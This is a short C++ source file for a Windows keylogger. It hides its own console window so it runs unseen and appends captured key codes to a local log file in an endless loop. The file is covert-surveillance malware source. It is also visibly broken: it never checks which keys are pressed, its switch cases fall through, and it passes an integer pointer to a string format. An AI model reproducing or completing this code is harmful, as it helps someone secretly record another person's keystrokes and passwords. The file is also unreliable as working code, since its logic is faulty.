

#include <iostream>
#include<fstream>
#include <Windows.h>
#include <time.h>



#include "one_time_creation.h"

#pragma warning(disable : 4996)

//^this disables the error message about the key saving method not being safe


void logfile(int &key)
{
	//TODO: create a new path for the logging file
	
	FILE* log;
	log = fopen("C:/logged/log.txt", "a+");//a+ to create a file if it doesnt exist and writes at then end.
	

	switch (key)
	{
	case VK_LSHIFT:
		fprintf(log, "%s", "[LEFT_SHIFT]");

	case VK_RSHIFT:
		fprintf(log, "%s", "[RIGHT_SHIFT]");

	case VK_DELETE:
		fprintf(log, "%s", "[DELETE]");
	case VK_ESCAPE:
		fprintf(log, "%s", "[ESC]");
	default:
		fprintf(log, "%s", &key);
		break;
	}

	fclose(log);
	
	
}


void hideconsole() 
{
	ShowWindow(GetConsoleWindow(), SW_FORCEMINIMIZE);
	ShowWindow(GetConsoleWindow(), SW_HIDE);//just in case the first attemp dont work


	//hides the console window to keep the application hidden



}



int main()
{
	path_creation();

	hideconsole();




	bool running = true;
	while (running == true)
	{
		//using ascii
		int i = 0;
		for (i > 8; i <= 255; i++) // starts and end of the mainly used ascii char
		{
			logfile(i);
		}
	}	
		

	
	return 0;
}
